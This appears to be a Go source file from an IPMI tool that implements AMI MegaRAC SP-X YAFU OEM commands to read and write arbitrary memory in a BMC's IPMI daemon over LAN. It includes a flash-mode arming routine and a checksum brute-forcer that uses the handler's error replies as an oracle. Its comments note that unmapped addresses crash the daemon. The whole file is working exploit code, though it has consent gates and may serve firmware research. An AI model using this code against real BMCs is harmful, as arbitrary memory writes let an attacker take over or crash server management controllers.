package ipmi

// AMI MegaRAC SP-X YAFU memory access (NetFn 0x32): ReadMemory/WriteMemory
// dereference a caller-supplied 32-bit pointer verbatim, over LAN at
// Administrator. The access is virtual, so SoC register pages are unreachable and
// an unmapped address SIGSEGVs the IPMI daemon, and it is gated on flash mode,
// which is disruptive and never armed implicitly here. The request checksum
// algorithm is unresolved from firmware, so it is selected against the handler's
// own mismatch error rather than guessed (see YAFUChecksumCandidates).

import (
	"context"
	"encoding/binary"
	"fmt"
	"hash/crc32"
	"strings"
	"time"
)

const (
	netFnAMIOEM byte = 0x32

	cmdYAFUActivateFlash byte = 0x10
	cmdYAFUReadMemory    byte = 0x30
	cmdYAFUWriteMemory   byte = 0x31
	cmdYAFUDeactivate    byte = 0x50

	// yafuHeaderLen is the 12-byte YAFU header every command in the family
	// carries: cookie, an echoed u16, the payload length, and the checksum.
	yafuHeaderLen = 12

	// ccYAFUError is the IPMI completion code the family uses for its own
	// errors; the detail byte is at response offset 13.
	ccYAFUError byte = 0x13
)

// YAFU error detail bytes, read out of the handler.
const (
	yafuErrNotInFlashMode byte = 0x08
	yafuErrChecksum       byte = 0x12
	yafuErrBadPayloadLen  byte = 0xCC
	yafuErrMalloc         byte = 0x02
)

// YAFUChecksum names one candidate algorithm for the request checksum.
type YAFUChecksum string

const (
	// YAFUCRC32 is a reflected CRC-32: initial value 0xFFFFFFFF, the standard
	// 0xEDB88320 table and a final one's complement, i.e. the IEEE polynomial as
	// Go's hash/crc32 computes it. This is AMI's CalculateChksum, and the default
	// because it is the only candidate with firmware behind it.
	YAFUCRC32 YAFUChecksum = "crc32"
	// YAFUSum32 is a 32-bit additive sum of the payload bytes. Kept as a
	// fallback for a build whose CalculateChksum turns out to differ.
	YAFUSum32 YAFUChecksum = "sum32"
	// YAFUSum16 is a 16-bit additive sum, zero-extended.
	YAFUSum16 YAFUChecksum = "sum16"
	// YAFUSum8 is an 8-bit additive sum, zero-extended.
	YAFUSum8 YAFUChecksum = "sum8"
	// YAFUTwosComp8 is the IPMI-style two's-complement checksum.
	YAFUTwosComp8 YAFUChecksum = "twos8"
	// YAFUXor8 is a byte-wise XOR, zero-extended.
	YAFUXor8 YAFUChecksum = "xor8"
	// YAFUZero sends a zero checksum, for builds that do not verify it.
	YAFUZero YAFUChecksum = "zero"
)

// YAFUChecksumCandidates is the probe order used to resolve the algorithm
// against the handler's own mismatch oracle.
var YAFUChecksumCandidates = []YAFUChecksum{YAFUCRC32, YAFUSum32, YAFUSum16, YAFUSum8, YAFUTwosComp8, YAFUXor8, YAFUZero}

// ParseYAFUChecksum normalizes a checksum=<algo> value. "probe" returns an
// empty value, which asks the caller to resolve it live.
func ParseYAFUChecksum(s string) (YAFUChecksum, error) {
	v := strings.ToLower(strings.TrimSpace(s))
	switch v {
	case "":
		return YAFUCRC32, nil
	case "probe", "auto":
		return "", nil
	}
	for _, c := range YAFUChecksumCandidates {
		if string(c) == v {
			return c, nil
		}
	}
	names := make([]string, 0, len(YAFUChecksumCandidates))
	for _, c := range YAFUChecksumCandidates {
		names = append(names, string(c))
	}
	return "", fmt.Errorf("unknown checksum %q (use probe or one of: %s)", s, strings.Join(names, ", "))
}

func yafuChecksum(algo YAFUChecksum, payload []byte) uint32 {
	var s32 uint32
	var x byte
	for _, b := range payload {
		s32 += uint32(b)
		x ^= b
	}
	switch algo {
	case YAFUCRC32:
		return crc32.ChecksumIEEE(payload)
	case YAFUSum16:
		return s32 & 0xffff
	case YAFUSum8:
		return s32 & 0xff
	case YAFUTwosComp8:
		return uint32(-int8(s32&0xff)) & 0xff
	case YAFUXor8:
		return uint32(x)
	case YAFUZero:
		return 0
	case YAFUSum32:
		return s32
	default:
		return crc32.ChecksumIEEE(payload)
	}
}

// yafuHeader builds the 12-byte header for a payload. The 16-bit field at offset
// 6 is the payload length on MegaRAC 3.x (5+datalen for a write; the read handler
// rejects anything but 7) and a constant device-type selector of 7 on 13.x. Reads
// agree either way; writes diverge and follow the 3.x reading, so a 13.x write
// refused with the bad-payload-length detail means pinning that field first.
func yafuHeader(cookie uint32, echo uint16, payload []byte, algo YAFUChecksum) []byte {
	h := make([]byte, yafuHeaderLen)
	binary.LittleEndian.PutUint32(h[0:4], cookie)
	binary.LittleEndian.PutUint16(h[4:6], echo)
	binary.LittleEndian.PutUint16(h[6:8], uint16(len(payload)))
	binary.LittleEndian.PutUint32(h[8:12], yafuChecksum(algo, payload))
	return h
}

// yafuDetail extracts the YAFU error detail byte from a reply.
func yafuDetail(resp []byte) (byte, bool) {
	// The completion code is stripped by the transport, so response[0] here
	// is what the handler wrote at offset 1: the echoed cookie. The detail
	// byte sits at handler offset 13, i.e. index 12 of the stripped data.
	if len(resp) > 12 {
		return resp[12], true
	}
	return 0, false
}

func yafuErrText(detail byte) string {
	switch detail {
	case yafuErrNotInFlashMode:
		return "not in flash mode: AMIYAFUActivateFlashMode (0x32/0x10) has not been run. That transition is disruptive, so this tool never sends it implicitly - add the bare token 'arm'"
	case yafuErrChecksum:
		return "request checksum mismatch: the CalculateChksum algorithm was not resolved from the firmware, so try checksum=probe"
	case yafuErrBadPayloadLen:
		return "payload-length field is wrong for this command"
	case yafuErrMalloc:
		return "allocation failure on the BMC"
	}
	return fmt.Sprintf("YAFU error 0x%02x", detail)
}

// YAFUArm puts the BMC into flash mode, which is the precondition for the
// memory commands. This is disruptive: the handler calls PrepareFlashArea and
// executes a constant system() command, and the paired deactivate/reset can
// reboot the BMC. Callers must obtain explicit consent before calling it.
func (s *CmdSess) YAFUArm(algo YAFUChecksum) error {
	// 12-byte header plus a 2-byte payload; the dispatcher enforces exactly
	// 14 bytes and answers CC 0xc7 otherwise.
	payload := []byte{0x00, 0x00}
	req := append(yafuHeader(0, 0, payload, algo), payload...)
	cc, resp, err := s.ExecRaw(netFnAMIOEM, cmdYAFUActivateFlash, req)
	if err != nil {
		return err
	}
	if cc == ccYAFUError {
		if d, ok := yafuDetail(resp); ok {
			return fmt.Errorf("activate flash mode: %s", yafuErrText(d))
		}
		return fmt.Errorf("activate flash mode: YAFU error")
	}
	if cc != 0x00 {
		return fmt.Errorf("activate flash mode cc=0x%02x (%s)", cc, yafuCCMeaning(cc))
	}
	return nil
}

// YAFUDisarm leaves flash mode.
func (s *CmdSess) YAFUDisarm(algo YAFUChecksum) error {
	req := yafuHeader(0, 0, nil, algo)
	cc, _, err := s.ExecRaw(netFnAMIOEM, cmdYAFUDeactivate, req)
	if err != nil {
		return err
	}
	if cc != 0x00 && cc != ccYAFUError {
		return fmt.Errorf("deactivate flash cc=0x%02x (%s)", cc, yafuCCMeaning(cc))
	}
	return nil
}

func yafuCCMeaning(cc byte) string {
	switch cc {
	case 0xc1:
		return "invalid command - this build has no AMI OEM YAFU table on NetFn 0x32"
	case 0xc7:
		return "request data length invalid - the dispatcher enforces an exact length for this command"
	case 0xd4:
		return "insufficient privilege - Administrator is required"
	case 0x13:
		return "YAFU error, see the detail byte"
	}
	return "unspecified"
}

// yafuReadUnit issues one ReadMemory request. The request is a fixed 19 bytes:
// the 12-byte header plus a 7-byte payload of {addr LE32, pad, len LE16}.
func (s *CmdSess) yafuReadUnit(addr uint32, length uint16, algo YAFUChecksum) ([]byte, byte, error) {
	payload := make([]byte, 7)
	binary.LittleEndian.PutUint32(payload[0:4], addr)
	payload[4] = 0x00
	binary.LittleEndian.PutUint16(payload[5:7], length)
	req := append(yafuHeader(0, 0, payload, algo), payload...)

	cc, resp, err := s.ExecRaw(netFnAMIOEM, cmdYAFUReadMemory, req)
	if err != nil {
		return nil, 0, err
	}
	if cc == ccYAFUError {
		d, _ := yafuDetail(resp)
		return nil, d, fmt.Errorf("yafu read: %s", yafuErrText(d))
	}
	if cc != 0x00 {
		return nil, 0, fmt.Errorf("yafu read cc=0x%02x (%s)", cc, yafuCCMeaning(cc))
	}
	// Response after the stripped completion code: cookie(4) pad(2)
	// len(2) checksum(4) then the data, i.e. the payload starts at index 12.
	if len(resp) < 12 {
		return nil, 0, fmt.Errorf("yafu read: short reply (%d bytes, expected at least the 12-byte header)", len(resp))
	}
	// A zero-length read replies with the header and nothing else; that is a
	// success, and it is exactly what the checksum probe relies on.
	data := resp[12:]
	if got := binary.LittleEndian.Uint16(resp[6:8]); int(got) < len(data) {
		data = data[:got]
	}
	return data, 0x00, nil
}

// YAFUResolveChecksum finds the checksum algorithm this build wants, using the
// handler's own mismatch error as the oracle. It issues one zero-length read
// per candidate, which dereferences nothing.
func (s *CmdSess) YAFUResolveChecksum(ctx context.Context) (YAFUChecksum, error) {
	for _, c := range YAFUChecksumCandidates {
		if err := ctx.Err(); err != nil {
			return "", err
		}
		// A zero-length read at a null address never dereferences: the
		// handler validates the checksum before the memcpy.
		_, detail, err := s.yafuReadUnit(0, 0, c)
		if err == nil {
			return c, nil
		}
		switch detail {
		case yafuErrChecksum:
			continue // this candidate is wrong; try the next
		case yafuErrNotInFlashMode:
			// The handler tests flash mode before the checksum, so this
			// answer carries no information about the checksum at all.
			// Probing further would just repeat it.
			return "", fmt.Errorf("cannot resolve the checksum while the BMC is not in flash mode: the handler checks flash mode first, so every candidate answers the same. " +
				"Arm it (the 'arm' token, which needs 'apply' because it is disruptive) and probe again")
		case 0:
			return "", fmt.Errorf("checksum probe: %w", err)
		}
		// The handler got past its own checksum test and refused for some
		// other reason, so this candidate is the right one.
		return c, nil
	}
	return "", fmt.Errorf("no candidate checksum was accepted; the build may not use any of %v", YAFUChecksumCandidates)
}

// MemReadYAFU reads length bytes from the IPMI daemon's virtual address space.
func (s *CmdSess) MemReadYAFU(ctx context.Context, addr uint64, length int, algo YAFUChecksum, opts MemReadOptions) ([]byte, MemStats, error) {
	var stats MemStats
	if addr > 0xffffffff {
		return nil, stats, fmt.Errorf("the YAFU address field is 32-bit; 0x%x is out of range", addr)
	}
	if length <= 0 {
		return nil, stats, fmt.Errorf("length must be positive")
	}
	// The length field is a u16, but the reply has to fit an IPMI LAN
	// datagram, so keep chunks well inside the practical MTU. The handler
	// applies no cap before the memcpy into the response buffer.
	chunk := chunkOr(opts.Unit, 128)
	if chunk > 512 {
		chunk = 512
	}
	retries := opts.Retries
	if retries < 1 {
		retries = 3
	}

	out := make([]byte, 0, length)
	for len(out) < length {
		if err := ctx.Err(); err != nil {
			return out, stats, err
		}
		n := min(chunk, length-len(out))
		cur := uint32(addr) + uint32(len(out))
		var got []byte
		var lastErr error
		for attempt := range retries {
			stats.Requests++
			d, detail, err := s.yafuReadUnit(cur, uint16(n), algo)
			if err == nil {
				got = d
				break
			}
			lastErr = err
			if detail != 0 {
				break // the handler answered; retrying learns nothing
			}
			stats.Retries++
			if opts.Delay > 0 {
				time.Sleep(opts.Delay * time.Duration(attempt+1))
			}
		}
		if got == nil {
			stats.Failures++
			return out, stats, fmt.Errorf("yafu read at 0x%08x: %w", cur, lastErr)
		}
		// A handler that answers CC 0x00 with no payload would otherwise spin
		// this loop forever, since the cursor is driven by how much came back.
		if len(got) == 0 {
			stats.Failures++
			return out, stats, fmt.Errorf("yafu read at 0x%08x returned no data", cur)
		}
		out = append(out, got...)
		if opts.Progress != nil {
			opts.Progress(fmt.Sprintf("yafu read 0x%08x: %d/%d bytes", cur, len(out), length))
		}
		if opts.Delay > 0 {
			time.Sleep(opts.Delay)
		}
	}
	return out[:length], stats, nil
}

// MemWriteYAFU writes data into the IPMI daemon's virtual address space.
func (s *CmdSess) MemWriteYAFU(ctx context.Context, addr uint64, data []byte, algo YAFUChecksum, opts MemWriteOptions) (MemStats, error) {
	var stats MemStats
	if addr > 0xffffffff {
		return stats, fmt.Errorf("the YAFU address field is 32-bit; 0x%x is out of range", addr)
	}
	if len(data) == 0 {
		return stats, fmt.Errorf("no data to write")
	}
	chunk := 128
	retries := opts.Retries
	if retries < 1 {
		retries = 3
	}

	for written := 0; written < len(data); {
		if err := ctx.Err(); err != nil {
			return stats, err
		}
		n := min(chunk, len(data)-written)
		cur := uint32(addr) + uint32(written)
		// Payload is {dst LE32, pad, data...}; the handler copies
		// payloadLen-5 bytes from payload offset 5.
		payload := make([]byte, 5, 5+n)
		binary.LittleEndian.PutUint32(payload[0:4], cur)
		payload = append(payload, data[written:written+n]...)
		req := append(yafuHeader(0, 0, payload, algo), payload...)

		var lastErr error
		ok := false
		for attempt := range retries {
			stats.Requests++
			cc, resp, err := s.ExecRaw(netFnAMIOEM, cmdYAFUWriteMemory, req)
			if err == nil && cc == 0x00 {
				ok = true
				break
			}
			if err == nil {
				if cc == ccYAFUError {
					d, _ := yafuDetail(resp)
					lastErr = fmt.Errorf("%s", yafuErrText(d))
				} else {
					lastErr = fmt.Errorf("cc=0x%02x (%s)", cc, yafuCCMeaning(cc))
				}
				break
			}
			lastErr = err
			stats.Retries++
			if opts.Delay > 0 {
				time.Sleep(opts.Delay * time.Duration(attempt+1))
			}
		}
		if !ok {
			stats.Failures++
			return stats, fmt.Errorf("yafu write at 0x%08x: %w", cur, lastErr)
		}
		written += n
		if opts.Progress != nil {
			opts.Progress(fmt.Sprintf("yafu write 0x%08x: %d/%d bytes", cur, written, len(data)))
		}
		if opts.Delay > 0 {
			time.Sleep(opts.Delay)
		}
	}
	return stats, nil
}
